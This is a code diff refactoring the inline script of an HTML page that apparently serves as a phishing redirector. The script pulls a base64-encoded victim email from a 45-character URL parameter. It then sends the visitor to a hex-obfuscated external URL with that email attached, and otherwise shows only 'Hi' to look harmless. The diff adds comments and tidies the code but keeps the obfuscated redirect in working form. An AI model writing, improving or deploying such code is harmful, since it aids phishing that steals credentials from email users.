@@ -6,11 +6,11 @@
 </head>
 <body>
     <script>
-        // Base64 decoding function
+        // Base64 decoding function with error handling
         function decodeBase64(encoded) {
             try {
                 return atob(encoded);
-            } catch (e) {
+            } catch {
                 return null;
             }
         }
@@ -18,10 +18,12 @@
         // Function to find and decode a 45-character key with a base64-encoded email value
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
+
             for (const [key, value] of urlParams.entries()) {
-                // Check if the key is exactly 45 characters and the value is base64-encoded
+                // Check if the key is exactly 45 characters and the value looks like base64
                 if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                     const decodedValue = decodeBase64(value);
+                    // Validate decoded email format
                     if (decodedValue && decodedValue.includes('@')) {
                         return decodedValue; // Return the decoded email if valid
                     }
@@ -31,7 +33,10 @@
         }
 
         // Hex-encoded URL for redirection
-        let u = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
+        const hexEncodedURL = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
+        
+        // Decode the hex-encoded URL
+        const decodedURL = decodeURIComponent('%' + hexEncodedURL.match(/.{1,2}/g).join('%'));
 
         // Check for a valid email parameter
         const email = findEmailParam();
@@ -39,7 +44,7 @@
         if (email) {
             // Redirect if email parameter is found
             const emailQuery = `&email=${encodeURIComponent(email)}`;
-            location.href = decodeURIComponent('%' + u.match(/.{1,2}/g).join('%')) + emailQuery;
+            location.href = decodedURL + emailQuery;
         } else {
             // Display "Hi" if no valid email parameter
             document.body.innerHTML = "<h1>Hi</h1>";
